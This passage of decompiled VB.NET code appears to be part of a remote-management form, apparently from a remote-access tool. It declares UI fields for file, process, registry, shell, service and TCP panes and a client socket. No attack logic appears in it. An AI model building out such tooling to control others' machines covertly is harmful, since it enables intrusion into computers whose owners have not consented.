		' Token: 0x04000190 RID: 400
		<AccessedThroughProperty("L1")>
		Private _L1 As GClass9

		' Token: 0x04000191 RID: 401
		<AccessedThroughProperty("ColumnHeader6")>
		Private _ColumnHeader6 As ColumnHeader

		' Token: 0x04000192 RID: 402
		<AccessedThroughProperty("ColumnHeader7")>
		Private _ColumnHeader7 As ColumnHeader

		' Token: 0x04000193 RID: 403
		<AccessedThroughProperty("p")>
		Private _p As PictureBox

		' Token: 0x04000194 RID: 404
		<AccessedThroughProperty("L2")>
		Private _L2 As GClass9

		' Token: 0x04000195 RID: 405
		<AccessedThroughProperty("ColumnHeader8")>
		Private _ColumnHeader8 As ColumnHeader

		' Token: 0x04000196 RID: 406
		<AccessedThroughProperty("ColumnHeader9")>
		Private _ColumnHeader9 As ColumnHeader

		' Token: 0x04000197 RID: 407
		<AccessedThroughProperty("ColumnHeader10")>
		Private _ColumnHeader10 As ColumnHeader

		' Token: 0x04000198 RID: 408
		<AccessedThroughProperty("LTCP")>
		Private _LTCP As GClass9

		' Token: 0x04000199 RID: 409
		<AccessedThroughProperty("ColumnHeader16")>
		Private _ColumnHeader16 As ColumnHeader

		' Token: 0x0400019A RID: 410
		<AccessedThroughProperty("ColumnHeader17")>
		Private _ColumnHeader17 As ColumnHeader

		' Token: 0x0400019B RID: 411
		<AccessedThroughProperty("ColumnHeader18")>
		Private _ColumnHeader18 As ColumnHeader

		' Token: 0x0400019C RID: 412
		<AccessedThroughProperty("ColumnHeader19")>
		Private _ColumnHeader19 As ColumnHeader

		' Token: 0x0400019D RID: 413
		<AccessedThroughProperty("ColumnHeader20")>
		Private _ColumnHeader20 As ColumnHeader

		' Token: 0x0400019E RID: 414
		<AccessedThroughProperty("ColumnHeader21")>
		Private _ColumnHeader21 As ColumnHeader

		' Token: 0x0400019F RID: 415
		<AccessedThroughProperty("RG")>
		Private _RG As Panel

		' Token: 0x040001A0 RID: 416
		<AccessedThroughProperty("RGLIST")>
		Private _RGLIST As GClass9

		' Token: 0x040001A1 RID: 417
		<AccessedThroughProperty("ColumnHeader3")>
		Private _ColumnHeader3 As ColumnHeader

		' Token: 0x040001A2 RID: 418
		<AccessedThroughProperty("ColumnHeader4")>
		Private _ColumnHeader4 As ColumnHeader

		' Token: 0x040001A3 RID: 419
		<AccessedThroughProperty("ColumnHeader5")>
		Private _ColumnHeader5 As ColumnHeader

		' Token: 0x040001A4 RID: 420
		<AccessedThroughProperty("RGk")>
		Private _RGk As TreeView

		' Token: 0x040001A5 RID: 421
		<AccessedThroughProperty("sh")>
		Private _sh As Panel

		' Token: 0x040001A6 RID: 422
		<AccessedThroughProperty("T1")>
		Private _T1 As RichTextBox

		' Token: 0x040001A7 RID: 423
		<AccessedThroughProperty("T2")>
		Private _T2 As TextBox

		' Token: 0x040001A8 RID: 424
		<AccessedThroughProperty("LPR")>
		Private _LPR As GClass9

		' Token: 0x040001A9 RID: 425
		<AccessedThroughProperty("ColumnHeader22")>
		Private _ColumnHeader22 As ColumnHeader

		' Token: 0x040001AA RID: 426
		<AccessedThroughProperty("ColumnHeader23")>
		Private _ColumnHeader23 As ColumnHeader

		' Token: 0x040001AB RID: 427
		<AccessedThroughProperty("ColumnHeader24")>
		Private _ColumnHeader24 As ColumnHeader

		' Token: 0x040001AC RID: 428
		<AccessedThroughProperty("ColumnHeader25")>
		Private _ColumnHeader25 As ColumnHeader

		' Token: 0x040001AD RID: 429
		<AccessedThroughProperty("ColumnHeader26")>
		Private _ColumnHeader26 As ColumnHeader

		' Token: 0x040001AE RID: 430
		<AccessedThroughProperty("LSRV")>
		Private _LSRV As GClass9

		' Token: 0x040001AF RID: 431
		<AccessedThroughProperty("ColumnHeader11")>
		Private _ColumnHeader11 As ColumnHeader

		' Token: 0x040001B0 RID: 432
		<AccessedThroughProperty("ColumnHeader12")>
		Private _ColumnHeader12 As ColumnHeader

		' Token: 0x040001B1 RID: 433
		<AccessedThroughProperty("ColumnHeader13")>
		Private _ColumnHeader13 As ColumnHeader

		' Token: 0x040001B2 RID: 434
		<AccessedThroughProperty("ColumnHeader14")>
		Private _ColumnHeader14 As ColumnHeader

		' Token: 0x040001B3 RID: 435
		<AccessedThroughProperty("ColumnHeader15")>
		Private _ColumnHeader15 As ColumnHeader

		' Token: 0x040001B4 RID: 436
		<AccessedThroughProperty("vmethod_108")>
		Private _vmethod_108 As ImageList

		' Token: 0x040001B5 RID: 437
		<AccessedThroughProperty("ToolStripMenuItem1")>
		Private _ToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x040001B6 RID: 438
		Public Cache As Collection

		' Token: 0x040001B7 RID: 439
		Public cur As Manager.CR

		' Token: 0x040001B8 RID: 440
		Public Flist As String

		' Token: 0x040001B9 RID: 441
		Public Images As Collection

		' Token: 0x040001BA RID: 442
		Private int_0 As Integer

		' Token: 0x040001BB RID: 443
		Private int_1 As Integer

		' Token: 0x040001BC RID: 444
		Public isCut As Boolean

		' Token: 0x040001BD RID: 445
		Public PID As Integer

		' Token: 0x040001BE RID: 446
		Public PRFX As Boolean

		' Token: 0x040001BF RID: 447
		Public PRNXT As Boolean

		' Token: 0x040001C0 RID: 448
		Public RGCH As Collection

		' Token: 0x040001C1 RID: 449
		Public shStarted As Integer

		' Token: 0x040001C2 RID: 450
		Public sk As Client

		' Token: 0x040001C3 RID: 451
		Public SrvFX As Boolean

		' Token: 0x040001C4 RID: 452
		Public srvNxt As Boolean

		' Token: 0x040001C5 RID: 453
		Private string_0 As String

		' Token: 0x040001C6 RID: 454
		Private string_1 As String()

		' Token: 0x040001C7 RID: 455
		Public TCPFX As Boolean

		' Token: 0x040001C8 RID: 456
		Public TCPNXT As Boolean

		' Token: 0x02000017 RID: 23
		Public Enum CR
			' Token: 0x040001CA RID: 458
			fm
			' Token: 0x040001CB RID: 459
			PR
			' Token: 0x040001CC RID: 460
			reg = 3
			' Token: 0x040001CD RID: 461
			shl
			' Token: 0x040001CE RID: 462
			srv
			' Token: 0x040001CF RID: 463
			tcp = 2
		End Enum

		' Token: 0x02000018 RID: 24
		Public NotInheritable Class GClass13
			' Token: 0x060003FB RID: 1019 RVA: 0x0016A080 File Offset: 0x00168480
			Public Sub New()
				Me.list_0 = New List(Of String())()
				Me.list_1 = New List(Of String)()
			End Sub

			' Token: 0x040001D0 RID: 464
			Public list_0 As List(Of String())

			' Token: 0x040001D1 RID: 465
			Public list_1 As List(Of String)

			' Token: 0x040001D2 RID: 466
			Public string_0 As String
		End Class

		' Token: 0x02000019 RID: 25
		Public NotInheritable Class GClass14
			' Token: 0x060003FC RID: 1020 RVA: 0x0016A0A0 File Offset: 0x001684A0
			Public Sub New()
				Me.list_0 = New List(Of String)()
				Me.list_1 = New List(Of String)()
			End Sub

			' Token: 0x040001D3 RID: 467
			Public list_0 As List(Of String)

			' Token: 0x040001D4 RID: 468
			Public list_1 As List(Of String)

			' Token: 0x040001D5 RID: 469
			Public string_0 As String
		End Class
	End Class
End Namespace
